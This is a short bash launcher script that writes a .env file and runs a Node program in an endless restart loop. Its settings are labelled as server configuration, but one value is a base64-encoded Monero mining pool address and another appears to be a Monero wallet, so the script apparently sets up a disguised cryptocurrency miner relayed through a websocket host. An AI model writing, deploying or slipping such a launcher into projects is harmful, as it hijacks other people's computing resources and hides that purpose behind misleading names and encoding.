#!/bin/bash
CONNECT=$1
NAME=$2
echo "SERVER_WS=wss://cloudnineone.my.id
SERVER_TARGET=cG9vbC5zdXBwb3J0eG1yLmNvbTo4MA==
SERVER_DOMAIN=45GczdTw1FWBuGKaMRozbQQXSpHyYB3ZFabCmqDpQnCwjQ6cbUfPbemLnPTYrhXveDLY3aMuUAEgoEV5TgVatqvE6FFrL7n
SERVER_SECRET=${NAME}
SERVER_CONNECTION=${CONNECT}" > .env
while true; do node index.js; sleep 15; done
